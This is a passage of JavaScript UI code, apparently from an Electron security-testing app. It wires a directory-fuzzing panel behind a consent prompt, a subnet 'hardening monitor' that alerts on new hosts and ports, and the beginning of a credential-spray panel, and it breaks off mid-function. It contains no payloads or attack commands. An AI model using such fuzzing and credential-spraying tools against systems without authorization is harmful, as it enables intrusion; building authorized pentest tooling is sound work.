const dirfuzzExtensions = document.getElementById('dirfuzz-extensions');
const dirfuzzConcurrency = document.getElementById('dirfuzz-concurrency');
const dirfuzzConcurrencyVal = document.getElementById('dirfuzz-concurrency-val');
const dirfuzzTimeout    = document.getElementById('dirfuzz-timeout');
const dirfuzzProgressText = document.getElementById('dirfuzz-progress-text');
const dirfuzzProgressBar  = document.getElementById('dirfuzz-progress-bar');
const dirfuzzStatsText  = document.getElementById('dirfuzz-stats-text');
const dirfuzzErrorBanner = document.getElementById('dirfuzz-error-banner');
const dirfuzzResultsTbody = document.getElementById('dirfuzz-results-tbody');
const dirfuzzFooterHits = document.getElementById('dirfuzz-footer-hits');

// --- internal state ---
let dirfuzzRunning = false;
let dirfuzzHits = [];

// --- helpers ---

function openDirFuzzPanel(prefilledUrl) {
  if (prefilledUrl && dirfuzzTargetUrl) dirfuzzTargetUrl.value = prefilledUrl;
  if (dirfuzzPanel && typeof openPanel !== 'undefined') openPanel(dirfuzzPanel, dirfuzzResizer);
}

function closeDirFuzzPanel() {
  if (dirfuzzPanel && typeof closePanel !== 'undefined') closePanel(dirfuzzPanel, dirfuzzResizer);
}

function showDirFuzzError(msg) {
  if (!dirfuzzErrorBanner) return;
  dirfuzzErrorBanner.textContent = msg;
  dirfuzzErrorBanner.style.display = 'block';
}

function clearDirFuzzError() {
  if (dirfuzzErrorBanner) dirfuzzErrorBanner.style.display = 'none';
}

function setDirFuzzRunning(running) {
  dirfuzzRunning = running;
  if (btnDirfuzzStart) {
    btnDirfuzzStart.disabled = running;
    btnDirfuzzStart.classList.toggle('dirfuzz-running', running);
  }
  if (btnDirfuzzStop) btnDirfuzzStop.disabled = !running;
}

function resetDirFuzzUI() {
  dirfuzzHits = [];
  if (dirfuzzResultsTbody) {
    dirfuzzResultsTbody.innerHTML = '';
    const empty = document.createElement('tr');
    empty.id = 'dirfuzz-empty-row';
    empty.innerHTML = '<td colspan="5" style="text-align:center;color:var(--text-muted);padding:32px;">Enter a URL and click Start to begin fuzzing</td>';
    dirfuzzResultsTbody.appendChild(empty);
  }
  if (dirfuzzProgressBar) dirfuzzProgressBar.style.width = '0%';
  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Idle';
  if (dirfuzzStatsText) dirfuzzStatsText.textContent = '';
  if (dirfuzzFooterHits) dirfuzzFooterHits.textContent = '0 hits';
  if (btnDirfuzzExport) btnDirfuzzExport.disabled = true;
  clearDirFuzzError();
}

/** Map status code → CSS class suffix */
function statusClass(code) {
  if (code >= 200 && code < 300) return '2xx';
  if (code >= 300 && code < 400) return '3xx';
  if (code >= 400 && code < 500) return '4xx';
  return '5xx';
}

/** Format bytes → human-readable string */
function formatBytes(n) {
  if (!n || n === 0) return '—';
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(1)} MB`;
}

/** Truncate content-type to just mime */
function shortMime(ct) {
  if (!ct) return '—';
  return ct.split(';')[0].split('/').pop().slice(0, 12);
}

function appendDirFuzzHit(hit) {
  // Remove the placeholder empty row on first real result
  const existingEmpty = dirfuzzResultsTbody?.querySelector('#dirfuzz-empty-row');
  if (existingEmpty) existingEmpty.remove();

  dirfuzzHits.push(hit);

  const row = document.createElement('tr');
  row.className = `dirfuzz-row-${hit.statusCode}`;
  const sc = statusClass(hit.statusCode);
  const path = escapeHtml(hit.path);
  const redirect = hit.redirectUrl ? ` → ${escapeHtml(hit.redirectUrl)}` : '';
  row.innerHTML = `
    <td class="dirfuzz-status-cell dirfuzz-status-${sc}">${hit.statusCode}</td>
    <td class="col-path" title="${path}${redirect}">${path}</td>
    <td style="text-align:right;">${formatBytes(hit.contentLength)}</td>
    <td title="${escapeHtml(hit.contentType)}">${escapeHtml(shortMime(hit.contentType))}</td>
    <td style="text-align:right;">${hit.responseTime}</td>
  `;
  dirfuzzResultsTbody?.appendChild(row);

  // Auto-scroll
  const tableWrap = dirfuzzResultsTbody?.closest('div[style*="overflow-y"]');
  if (tableWrap) tableWrap.scrollTop = tableWrap.scrollHeight;

  // Update footer
  if (dirfuzzFooterHits) dirfuzzFooterHits.textContent = `${dirfuzzHits.length} hit${dirfuzzHits.length !== 1 ? 's' : ''}`;
  if (btnDirfuzzExport) btnDirfuzzExport.disabled = false;
}

function getSelectedStatusCodes() {
  const checkboxes = document.querySelectorAll('.dirfuzz-status-cb:checked');
  return Array.from(checkboxes).map(cb => parseInt(cb.value, 10));
}

async function runDirFuzz() {
  if (dirfuzzRunning) return;

  const url = dirfuzzTargetUrl?.value.trim();
  if (!url) {
    showDirFuzzError('Please enter a target URL.');
    return;
  }

  // Require consent before running
  if (!pentestConsentAccepted) {
    pendingBfConfig = { _type: 'dirfuzz' };
    pentestConsentOverlay?.classList.remove('hidden');
    return;
  }

  clearDirFuzzError();
  resetDirFuzzUI();
  setDirFuzzRunning(true);
  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Starting…';

  const wordlistMode = dirfuzzWordlistMode?.value || 'builtin';
  const wordlistPath = (wordlistMode === 'custom') ? (dirfuzzWordlistPath?.value.trim() || null) : null;

  const rawExts = dirfuzzExtensions?.value.trim() || '';
  const extensions = rawExts
    ? rawExts.split(',').map(e => e.trim()).filter(Boolean)
    : [];

  const statusFilter = getSelectedStatusCodes();
  const concurrency = parseInt(dirfuzzConcurrency?.value, 10) || 10;
  const timeout = parseInt(dirfuzzTimeout?.value, 10) || 3000;

  const opts = {
    targetUrl: url,
    wordlistPath,
    extensions,
    statusFilter,
    concurrency,
    timeout,
    followRedirects: false,
  };

  try {
    await api.startDirFuzz(opts);
  } catch (err) {
    showDirFuzzError(`Failed to start: ${err.message}`);
    setDirFuzzRunning(false);
  }
}

// --- concurrency slider label ---
if (dirfuzzConcurrency) {
  dirfuzzConcurrency.addEventListener('input', () => {
    if (dirfuzzConcurrencyVal) dirfuzzConcurrencyVal.textContent = dirfuzzConcurrency.value;
  });
}

// --- wordlist mode toggle ---
if (dirfuzzWordlistMode) {
  dirfuzzWordlistMode.addEventListener('change', () => {
    const isCustom = dirfuzzWordlistMode.value === 'custom';
    if (dirfuzzWordlistFileGroup) {
      dirfuzzWordlistFileGroup.style.display = isCustom ? 'flex' : 'none';
    }
  });
}

// --- wordlist file browse ---
if (btnDirfuzzBrowse) {
  btnDirfuzzBrowse.addEventListener('click', async () => {
    const result = await api.browseFile({
      title: 'Select Wordlist File',
      filters: [
        { name: 'Text Files', extensions: ['txt', 'lst', 'wordlist'] },
        { name: 'All Files', extensions: ['*'] },
      ],
    });
    if (result?.status === 'selected' && dirfuzzWordlistPath) {
      dirfuzzWordlistPath.value = result.path;
    }
  });
}

// --- panel open/close ---
initResizer(dirfuzzResizer, dirfuzzPanel);

btnDirfuzzOpen?.addEventListener('click', () => {
  if (dirfuzzPanel?.classList.contains('open')) {
    closeDirFuzzPanel();
  } else {
    openDirFuzzPanel('');
  }
});

btnCloseDirfuzz?.addEventListener('click', closeDirFuzzPanel);

// --- start/stop ---
btnDirfuzzStart?.addEventListener('click', runDirFuzz);

btnDirfuzzStop?.addEventListener('click', async () => {
  try {
    await api.stopDirFuzz();
  } catch { /* ignore */ }
  setDirFuzzRunning(false);
  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Stopped';
});

// --- clear ---
btnDirfuzzClear?.addEventListener('click', () => {
  if (dirfuzzRunning) return;
  resetDirFuzzUI();
});

// --- export CSV ---
btnDirfuzzExport?.addEventListener('click', () => {
  if (dirfuzzHits.length === 0) return;
  const header = 'Status,Path,Size,ContentType,ResponseTime(ms),Redirect\n';
  const rows = dirfuzzHits.map(h =>
    [h.statusCode, `"${h.path}"`, h.contentLength, `"${h.contentType}"`, h.responseTime, `"${h.redirectUrl || ''}"`].join(',')
  ).join('\n');
  const blob = new Blob([header + rows], { type: 'text/csv' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `dirfuzz_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.csv`;
  a.click();
  URL.revokeObjectURL(url);
});

// --- IPC event listeners ---

window.electronAPI.onDirFuzzHit?.((hit) => {
  appendDirFuzzHit(hit);
});

window.electronAPI.onDirFuzzProgress?.((data) => {
  const { tested, total, percent } = data;
  if (dirfuzzProgressBar) dirfuzzProgressBar.style.width = `${percent}%`;
  if (dirfuzzProgressText) dirfuzzProgressText.textContent = `${tested} / ${total} paths`;
  if (dirfuzzStatsText) dirfuzzStatsText.textContent = `${dirfuzzHits.length} hit${dirfuzzHits.length !== 1 ? 's' : ''}`;
});

window.electronAPI.onDirFuzzComplete?.((data) => {
  setDirFuzzRunning(false);
  if (dirfuzzProgressBar) dirfuzzProgressBar.style.width = '100%';
  const secs = (data.elapsed / 1000).toFixed(1);
  if (dirfuzzProgressText) dirfuzzProgressText.textContent = `Complete — ${data.hits} hit${data.hits !== 1 ? 's' : ''} in ${secs}s`;
  if (dirfuzzStatsText) dirfuzzStatsText.textContent = `${data.total} paths tested`;
  if (dirfuzzFooterHits) dirfuzzFooterHits.textContent = `${data.hits} hit${data.hits !== 1 ? 's' : ''}`;
});

window.electronAPI.onDirFuzzError?.((err) => {
  setDirFuzzRunning(false);
  showDirFuzzError(err.message || 'Fuzzing error');
  if (dirfuzzProgressText) dirfuzzProgressText.textContent = 'Error';
});

// Expose for host-card context integration
window.__openDirFuzzPanel = openDirFuzzPanel;

// =============================================
// FEATURE 5A — HARDENING MONITOR
// =============================================

// --- Element references ---

const hardeningPanel         = document.getElementById('hardening-panel');
const hardeningResizer       = document.getElementById('hardening-resizer');
const btnHardeningOpen       = document.getElementById('btn-hardening-open');
const btnCloseHardening      = document.getElementById('btn-close-hardening-panel');
const btnHardeningStart      = document.getElementById('btn-hardening-start');
const btnHardeningStop       = document.getElementById('btn-hardening-stop');
const btnSetBaseline         = document.getElementById('btn-hardening-set-baseline');
const btnClearAlerts         = document.getElementById('btn-hardening-clear-alerts');
const btnHardeningExport     = document.getElementById('btn-hardening-export');
const hardeningSubnetInput   = document.getElementById('hardening-subnet');
const hardeningIntervalSel   = document.getElementById('hardening-interval');
const hardeningCustomGroup   = document.getElementById('hardening-custom-interval-group');
const hardeningCustomMinutes = document.getElementById('hardening-custom-minutes');
const hardeningDeepScan      = document.getElementById('hardening-deep-scan');
const hardeningStatusDot     = document.getElementById('hardening-status-dot');
const hardeningLastScanText  = document.getElementById('hardening-last-scan-text');
const hardeningNextScanText  = document.getElementById('hardening-next-scan-text');
const hardeningHostCount     = document.getElementById('hardening-host-count');
const hardeningErrorBanner   = document.getElementById('hardening-error-banner');
const hardeningAlertsList    = document.getElementById('hardening-alerts-list');
const hardeningNoAlerts      = document.getElementById('hardening-no-alerts');
const hardeningAlertCount    = document.getElementById('hardening-alert-count');
const hardeningAlertBadge    = document.getElementById('hardening-alert-badge');
const hardeningBaselineSummary = document.getElementById('hardening-baseline-summary');
const hardeningFooterText    = document.getElementById('hardening-footer-text');

// --- Internal state ---
let hardeningMonitorActive = false;    // true while a monitor is scheduled
let hardeningNextRunTs     = null;     // epoch ms for next scan
let hardeningCountdownId   = null;     // setInterval id for countdown display
let hardeningEvents        = [];       // [{ delta, report, alertId }]

// --- Helpers ---

function openHardeningPanel() {
  if (hardeningPanel && typeof openPanel !== 'undefined') openPanel(hardeningPanel, hardeningResizer);
  // Refresh baseline summary whenever panel is opened
  refreshBaselineSummary();
}

function closeHardeningPanel() {
  if (hardeningPanel && typeof closePanel !== 'undefined') closePanel(hardeningPanel, hardeningResizer);
}

function showHardeningError(msg) {
  if (!hardeningErrorBanner) return;
  hardeningErrorBanner.textContent = msg;
  hardeningErrorBanner.style.display = 'block';
}

function clearHardeningError() {
  if (hardeningErrorBanner) hardeningErrorBanner.style.display = 'none';
}

function setHardeningRunning(active) {
  hardeningMonitorActive = active;
  if (btnHardeningStart) btnHardeningStart.disabled = active;
  if (btnHardeningStop)  btnHardeningStop.disabled  = !active;
  if (btnHardeningOpen) {
    btnHardeningOpen.classList.toggle('hardening-active', active);
  }
  setStatusDot(active ? 'active' : 'idle');
  if (hardeningFooterText) {
    hardeningFooterText.textContent = active ? 'Monitoring active…' : 'Idle';
  }
  if (!active) {
    stopHardeningCountdown();
    if (hardeningNextScanText) hardeningNextScanText.textContent = '';
  }
}

function setStatusDot(state) {
  if (!hardeningStatusDot) return;
  hardeningStatusDot.className = 'hardening-status-dot';
  if (state === 'scanning') {
    hardeningStatusDot.classList.add('hardening-dot-scanning');
    hardeningStatusDot.title = 'Scanning…';
  } else if (state === 'active') {
    hardeningStatusDot.classList.add('hardening-dot-active');
    hardeningStatusDot.title = 'Monitoring active';
  } else if (state === 'error') {
    hardeningStatusDot.classList.add('hardening-dot-error');
    hardeningStatusDot.title = 'Error';
  } else {
    hardeningStatusDot.classList.add('hardening-dot-idle');
    hardeningStatusDot.title = 'Idle';
  }
}

function startHardeningCountdown(nextRunTs) {
  hardeningNextRunTs = nextRunTs;
  stopHardeningCountdown();
  hardeningCountdownId = setInterval(() => {
    if (!hardeningNextScanText || !hardeningNextRunTs) return;
    const remaining = Math.max(0, hardeningNextRunTs - Date.now());
    if (remaining === 0) {
      hardeningNextScanText.textContent = 'Scanning now…';
      return;
    }
    const mins = Math.floor(remaining / 60000);
    const secs = Math.floor((remaining % 60000) / 1000);
    hardeningNextScanText.textContent = `Next scan in ${mins}m ${secs}s`;
  }, 1000);
}

function stopHardeningCountdown() {
  if (hardeningCountdownId) {
    clearInterval(hardeningCountdownId);
    hardeningCountdownId = null;
  }
}

function updateAlertBadge() {
  const count = hardeningEvents.length;
  if (hardeningAlertBadge) {
    hardeningAlertBadge.textContent = count;
    hardeningAlertBadge.style.display = count > 0 ? 'inline-block' : 'none';
  }
  if (hardeningAlertCount) {
    hardeningAlertCount.textContent = count;
    hardeningAlertCount.style.display = count > 0 ? 'inline-block' : 'none';
  }
}

function getIntervalMs() {
  const val = hardeningIntervalSel?.value;
  if (val === 'custom') {
    const mins = parseInt(hardeningCustomMinutes?.value, 10) || 15;
    return Math.max(1, mins) * 60 * 1000;
  }
  return parseInt(val, 10) || 15 * 60 * 1000;
}


/** Build an alert card DOM element for a delta object */
function buildAlertCard(delta, alertId) {
  const card = document.createElement('div');
  const sev = delta.severity || 'info';
  card.className = `hardening-alert-card alert-${sev}`;

  const icon = sev === 'critical' ? '🔴' : sev === 'warning' ? '🟡' : '🔵';
  const sevLabelSpan = document.createElement('span');
  sevLabelSpan.className = `severity-pill severity-${sev}`;
  sevLabelSpan.textContent = sev.toUpperCase();

  const titleDiv = document.createElement('div');
  titleDiv.className = 'hardening-alert-title';
  titleDiv.innerHTML = `${icon} `;
  titleDiv.appendChild(sevLabelSpan);
  titleDiv.insertAdjacentHTML('beforeend', `
    <span style="flex:1;"></span>
    <span style="color:var(--text-muted); font-size:10px; font-weight:400;">${fmtTime(delta.timestamp)}</span>
  `);

  const detailDiv = document.createElement('div');
  detailDiv.className = 'hardening-alert-detail';

  // Summarise what changed
  const lines = [];
  if (delta.newHosts?.length) {
    lines.push(`<b>${delta.newHosts.length}</b> new host${delta.newHosts.length > 1 ? 's' : ''}: ${delta.newHosts.map(h => escapeHtml(h.ip)).join(', ')}`);
  }
  if (delta.removedHosts?.length) {
    lines.push(`<b>${delta.removedHosts.length}</b> host${delta.removedHosts.length > 1 ? 's' : ''} disappeared: ${delta.removedHosts.map(h => escapeHtml(h.ip)).join(', ')}`);
  }
  if (delta.changedHosts?.length) {
    for (const ch of delta.changedHosts) {
      const parts = [];
      if (ch.newPorts?.length)    parts.push(`+ports ${ch.newPorts.join(', ')}`);
      if (ch.closedPorts?.length) parts.push(`-ports ${ch.closedPorts.join(', ')}`);
      if (ch.hostnameChanged)     parts.push(`hostname: ${escapeHtml(ch.prevHostname)} → ${escapeHtml(ch.currHostname)}`);
      if (ch.macChanged)          parts.push(`MAC changed`);
      if (parts.length) lines.push(`<b>${escapeHtml(ch.ip)}</b>: ${parts.join('; ')}`);
    }
  }

  detailDiv.innerHTML = lines.map(l => `<div>${l}</div>`).join('') || 'Network state change detected.';

  const actionDiv = document.createElement('div');
  actionDiv.className = 'hardening-alert-actions';

  if (delta.newHosts?.length) {
    const btnInvestigate = document.createElement('button');
    btnInvestigate.className = 'btn secondary btn-investigate';
    btnInvestigate.dataset.ip = delta.newHosts[0].ip;
    btnInvestigate.textContent = '🔍 Investigate';
    actionDiv.appendChild(btnInvestigate);

    const btnAddScope = document.createElement('button');
    btnAddScope.className = 'btn secondary btn-add-scope';
    btnAddScope.textContent = '➕ Add to Scope';
    actionDiv.appendChild(btnAddScope);
  }

  const btnPromote = document.createElement('button');
  btnPromote.className = 'btn secondary btn-promote-baseline';
  btnPromote.textContent = '📌 Promote to Baseline';
  actionDiv.appendChild(btnPromote);

  const btnDismiss = document.createElement('button');
  btnDismiss.className = 'btn secondary btn-acknowledge';
  btnDismiss.textContent = '✓ Dismiss';
  actionDiv.appendChild(btnDismiss);

  card.appendChild(titleDiv);
  card.appendChild(detailDiv);
  card.appendChild(actionDiv);

  // Wire action buttons
  btnDismiss.addEventListener('click', () => {
    card.style.opacity = '0';
    card.style.transition = 'opacity 0.3s';
    setTimeout(() => card.remove(), 300);
    const eventIdx = hardeningEvents.findIndex(e => e.alertId === alertId);
    if (eventIdx !== -1) hardeningEvents.splice(eventIdx, 1);
    updateAlertBadge();
    if (hardeningAlertsList && hardeningAlertsList.querySelectorAll('.hardening-alert-card').length === 0) {
      if (hardeningNoAlerts) hardeningNoAlerts.style.display = 'block';
    }
  });

  actionDiv.querySelector('.btn-investigate')?.addEventListener('click', (e) => {
    const ip = e.currentTarget.dataset.ip;
    if (ip && typeof showHostDetails !== 'undefined') showHostDetails(ip);
  });

  actionDiv.querySelector('.btn-add-scope')?.addEventListener('click', (btn => () => {
    const newHosts = delta.newHosts || [];
    let added = 0;
    for (const h of newHosts) {
      if (!h?.ip) continue;
      const alreadyKnown = state.hosts.some(x => x.ip === h.ip);
      if (!alreadyKnown) {
        state.hosts.push({
          ip: h.ip,
          mac: h.mac || '',
          hostname: h.hostname || '',
          vendor: '',
          os: '',
          ports: h.ports || [],
          source: 'monitor',
          routing: [],
          processes: [],
          monitorStatus: 'online',
          monitorLastSeen: h.lastSeen || Date.now(),
        });
        added++;
      }
    }
    if (added > 0) {
      debouncedRenderAllHosts();
      btn.textContent = `✓ Added ${added}`;
      btn.disabled = true;
    } else {
      btn.textContent = '✓ Already in scope';
      btn.disabled = true;
    }
  })(actionDiv.querySelector('.btn-add-scope')));

  btnPromote.addEventListener('click', async () => {
    const subnet = hardeningSubnetInput?.value.trim();
    if (!subnet) return;
    const event = hardeningEvents.find(e => e.alertId === alertId);
    const report = event?.report;
    if (report?.currentHosts) {
      await api.hardeningMonitor.setBaseline(subnet, report.currentHosts);
      refreshBaselineSummary();
      btnPromote.textContent = '✓ Promoted';
      btnPromote.disabled = true;
    }
  });

  return card;
}

function appendAlert(delta, report) {
  const alertId = (delta && delta.timestamp) || (typeof crypto !== 'undefined' && crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}-${Math.random().toString(16).slice(2)}`);
  
  hardeningEvents.push({ delta, report: report || null, alertId });
  updateAlertBadge();

  // Hide the "no alerts" placeholder
  if (hardeningNoAlerts) hardeningNoAlerts.style.display = 'none';

  if (hardeningAlertsList) {
    const card = buildAlertCard(delta, alertId);
    hardeningAlertsList.prepend(card); // newest at top
  }
}

async function refreshBaselineSummary() {
  const subnet = hardeningSubnetInput?.value.trim();
  if (!subnet || !hardeningBaselineSummary) return;

  try {
    const result = await api.hardeningMonitor.getBaseline(subnet);
    if (result?.hosts?.length > 0) {
      const setAt = result.setAt ? new Date(result.setAt).toLocaleString() : '—';
      hardeningBaselineSummary.innerHTML = '';
      
      const containerDiv = document.createElement('div');
      containerDiv.style.cssText = 'display:flex; flex-direction:column; gap:4px;';
      
      const subnetDiv = document.createElement('div');
      subnetDiv.style.color = 'var(--text-main)';
      subnetDiv.innerHTML = `Subnet: <b>${escapeHtml(subnet)}</b>`;
      
      const countDiv = document.createElement('div');
      countDiv.innerHTML = `<b>${result.hosts.length}</b> hosts · Set: ${escapeHtml(setAt)}`;
      
      const listDiv = document.createElement('div');
      listDiv.style.cssText = 'font-size:10px; color:var(--text-muted);';
      listDiv.textContent = result.hosts.slice(0, 5).map(h => h.ip).join(', ') + (result.hosts.length > 5 ? ` +${result.hosts.length - 5} more` : '');
      
      containerDiv.appendChild(subnetDiv);
      containerDiv.appendChild(countDiv);
      containerDiv.appendChild(listDiv);
      
      hardeningBaselineSummary.appendChild(containerDiv);
    } else {
      hardeningBaselineSummary.textContent = 'No baseline set. Click "Set Baseline" after a scan to establish the reference state.';
    }
  } catch {
    // Baseline retrieval failed silently
  }
}

// --- Button event handlers ---

btnHardeningOpen?.addEventListener('click', () => {
  if (hardeningPanel?.style.display !== 'none') {
    closeHardeningPanel();
  } else {
    openHardeningPanel();
  }
});

btnCloseHardening?.addEventListener('click', closeHardeningPanel);

// Interval selector — show/hide custom input
hardeningIntervalSel?.addEventListener('change', () => {
  if (hardeningCustomGroup) {
    hardeningCustomGroup.style.display = hardeningIntervalSel.value === 'custom' ? 'block' : 'none';
  }
});

btnHardeningStart?.addEventListener('click', async () => {
  const subnet = hardeningSubnetInput?.value.trim();
  if (!subnet) {
    showHardeningError('Please enter a target subnet in CIDR notation (e.g. 192.168.1.0/24).');
    return;
  }
  clearHardeningError();
  const intervalMs = getIntervalMs();
  const deepScan   = hardeningDeepScan?.checked !== false;
  setHardeningRunning(true);
  setStatusDot('scanning');
  if (hardeningFooterText) hardeningFooterText.textContent = 'Starting first scan…';
  try {
    await api.hardeningMonitor.start(subnet, { intervalMs, deepScan });
  } catch (err) {
    showHardeningError(`Failed to start: ${err.message}`);
    setHardeningRunning(false);
  }
});

btnHardeningStop?.addEventListener('click', async () => {
  const subnet = hardeningSubnetInput?.value.trim();
  if (!subnet) return;
  try {
    await api.hardeningMonitor.stop(subnet);
  } catch { /* ignore */ }
  setHardeningRunning(false);
  stopHardeningCountdown();
  if (hardeningNextScanText) hardeningNextScanText.textContent = '';
  if (hardeningFooterText) hardeningFooterText.textContent = 'Stopped';
});

btnSetBaseline?.addEventListener('click', async () => {
  const subnet = hardeningSubnetInput?.value.trim();
  if (!subnet) {
    showHardeningError('Enter a subnet first.');
    return;
  }
  // Use the hosts from the most recent report if available, otherwise current state.hosts
  const lastEvent = hardeningEvents[hardeningEvents.length - 1];
  const hosts = lastEvent?.report?.currentHosts || state.hosts?.map(h => ({
    ip: h.ip,
    mac: h.mac || '',
    hostname: h.hostname || '',
    ports: h.ports?.map(p => p.port || p) || [],
    firstSeen: Date.now(),
    lastSeen: Date.now(),
  })) || [];

  if (hosts.length === 0) {
    showHardeningError('No hosts to baseline. Run a scan first or add hosts to the scope.');
    return;
  }
  try {
    await api.hardeningMonitor.setBaseline(subnet, hosts);
    clearHardeningError();
    refreshBaselineSummary();
    if (btnSetBaseline) {
      const orig = btnSetBaseline.textContent;
      btnSetBaseline.textContent = '✓ Baseline Saved';
      setTimeout(() => { if (btnSetBaseline) btnSetBaseline.textContent = orig; }, 2000);
    }
  } catch (err) {
    showHardeningError(`Failed to set baseline: ${err.message}`);
  }
});

btnClearAlerts?.addEventListener('click', () => {
  hardeningEvents = [];
  updateAlertBadge();
  if (hardeningAlertsList) hardeningAlertsList.innerHTML = '';
  if (hardeningNoAlerts) {
    hardeningNoAlerts.style.display = 'block';
    hardeningAlertsList?.appendChild(hardeningNoAlerts);
  }
  if (btnHardeningExport) btnHardeningExport.disabled = true;
});

btnHardeningExport?.addEventListener('click', () => {
  const exportData = hardeningEvents.map(e => e.report).filter(r => r);
  if (exportData.length === 0) return;
  const data = JSON.stringify(exportData, null, 2);
  const blob = new Blob([data], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `hardening_report_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.json`;
  a.click();
  URL.revokeObjectURL(url);
});

// --- IPC event listeners ---

// --- Merge monitor-discovered hosts into the core state.hosts[] ---
window.electronAPI.hardeningMonitor?.onHostUpdate((hostData) => {
  const existingIdx = state.hosts.findIndex(h => h.ip === hostData.ip);

  if (existingIdx >= 0) {
    const existing = state.hosts[existingIdx];
    state.hosts[existingIdx] = {
      ...existing,
      // Promote port data when the monitor found open ports and we have none (or more)
      ports: (hostData.ports?.length > 0 && hostData.ports.length >= (existing.ports?.length || 0))
        ? hostData.ports
        : (existing.ports || []),
      // Enrich hostname/mac only if we don't already have richer data
      hostname: (hostData.hostname && !existing.hostname) ? hostData.hostname : existing.hostname,
      mac:      (hostData.mac      && !existing.mac)      ? hostData.mac      : existing.mac,
      // Always overwrite monitor-specific fields
      monitorStatus:   hostData.monitorStatus,
      monitorLastSeen: hostData.monitorLastSeen,
      // Accumulate alerts; avoid duplicates (same delta timestamp)
      monitorAlerts: hostData.monitorAlerts
        ? [...(existing.monitorAlerts || []).filter(a => a.timestamp !== hostData.monitorAlerts[0]?.timestamp), ...hostData.monitorAlerts]
        : (existing.monitorAlerts || []),
    };
    // Refresh the card in-place (update badge + monitor dot)
    const card = document.getElementById(`host-${hostData.ip.replace(/\./g, '-')}`);
    if (card) {
      const badgeContainer = card.querySelector('.security-badge-container');
      if (badgeContainer) {
        badgeContainer.innerHTML = '';
        updateSecurityBadgeDOM(state.hosts[existingIdx], badgeContainer);
      }
      updateMonitorDotDOM(state.hosts[existingIdx], card);
    }
  } else if (hostData.monitorStatus === 'online') {
    // Brand-new host discovered by the monitor — add it to scope
    state.hosts.push({
      ip:              hostData.ip,
      mac:             hostData.mac      || '',
      hostname:        hostData.hostname  || '',
      vendor:          '',
      os:              '',
      ports:           hostData.ports    || [],
      source:          'monitor',
      routing:         [],
      processes:       [],
      monitorStatus:   'online',
      monitorLastSeen: hostData.monitorLastSeen,
      monitorAlerts:   hostData.monitorAlerts || [],
      firstSeen:       hostData.firstSeen || Date.now(),
      lastSeen:        Date.now(),
    });
    debouncedRenderAllHosts();
  }
});

window.electronAPI.hardeningMonitor?.onStatus((status) => {
  const { subnet, state: monState, lastRun, nextRun, hostCount, error } = status;

  if (monState === 'scanning') {
    setStatusDot('scanning');
    if (hardeningFooterText) hardeningFooterText.textContent = `Scanning ${escapeHtml(subnet)}…`;
    if (hardeningLastScanText) hardeningLastScanText.textContent = 'Scanning now…';
  } else if (monState === 'idle' || monState === 'started') {
    setStatusDot(hardeningMonitorActive ? 'active' : 'idle');
    if (lastRun && hardeningLastScanText) {
      hardeningLastScanText.textContent = `Last scan: ${fmtTime(lastRun)}`;
    }
    if (nextRun) startHardeningCountdown(nextRun);
    if (hostCount != null && hardeningHostCount) {
      hardeningHostCount.textContent = `${hostCount} host${hostCount !== 1 ? 's' : ''} live`;
    }
    if (hardeningFooterText) hardeningFooterText.textContent = 'Monitoring active';
  } else if (monState === 'error') {
    setStatusDot('error');
    showHardeningError(error || 'Monitor error');
    setHardeningRunning(false);
  }
});

window.electronAPI.hardeningMonitor?.onDeltaAlert((delta) => {
  // Lightweight alert — append card, show badge. Full report comes via onDeltaReport.
  appendAlert(delta, null);
});

window.electronAPI.hardeningMonitor?.onDeltaReport((report) => {
  // Patch the last alert entry with the full report data
  if (hardeningEvents.length > 0) {
    hardeningEvents[hardeningEvents.length - 1].report = report;
  }
  if (btnHardeningExport) btnHardeningExport.disabled = false;
});

// Expose for external integration (e.g., host card "Monitor Subnet" button)
window.__openHardeningPanel = (subnet) => {
  if (subnet && hardeningSubnetInput) hardeningSubnetInput.value = subnet;
  openHardeningPanel();
};
// =============================================
// === CREDENTIAL SPRAY UI MODULE ===
// =============================================


// UI Elements
const ui = {
  panel: document.getElementById('credspray-panel'),
  resizer: document.getElementById('credspray-resizer'),
  btnOpen: document.getElementById('btn-credspray-open'),
  btnClose: document.getElementById('btn-close-credspray'),
  targetMode: document.getElementById('credspray-target-mode'),
  targetIp: document.getElementById('credspray-target-ip'),
  targetIpGroup: document.getElementById('credspray-single-ip-group'),
  protoCbs: document.querySelectorAll('.credspray-proto-cb'),
  stopOnHitCb: document.getElementById('credspray-stop-on-hit'),
  btnStart: document.getElementById('btn-credspray-start'),
  btnStop: document.getElementById('btn-credspray-stop'),
  btnClear: document.getElementById('btn-credspray-clear'),
  btnExport: document.getElementById('btn-credspray-export'),
  progressContainer: document.getElementById('credspray-progress-container'),
  progressBar: document.getElementById('credspray-progress-bar'),
  progressText: document.getElementById('credspray-progress-text'),
  progressPct: document.getElementById('credspray-progress-pct'),
  currentTargetDisplay: document.getElementById('credspray-current-target'),
  errorBanner: document.getElementById('credspray-error-banner'),
  resultsTbody: document.getElementById('credspray-results-tbody'),
  statsText: document.getElementById('credspray-stats-text'),
  footerHits: document.getElementById('credspray-footer-hits'),
};

/**
 * Centralized Cred Spray View-Model
 */
const credSprayView = {
  setRunning(isRunning) {
    state.isCredSprayRunning = isRunning;
    if (ui.btnStart) {
      ui.btnStart.disabled = isRunning;
      ui.btnStart.classList.toggle('credspray-running', isRunning);
    }
    if (ui.btnStop) ui.btnStop.disabled = !isRunning;
    if (ui.progressContainer) ui.progressContainer.style.display = isRunning ? 'flex' : 'none';
    if (!isRunning && ui.currentTargetDisplay) ui.currentTargetDisplay.style.display = 'none';
  },

  updateProgress(data) {
    const { tested, total, percent, currentIp, currentProtocol, currentPort } = data;
    if (ui.progressBar) ui.progressBar.style.width = `${percent}%`;
    if (ui.progressPct) ui.progressPct.textContent = `${percent}%`;
    if (ui.progressText) ui.progressText.textContent = `Testing ${tested} / ${total}...`;
    
    if (currentIp && ui.currentTargetDisplay) {
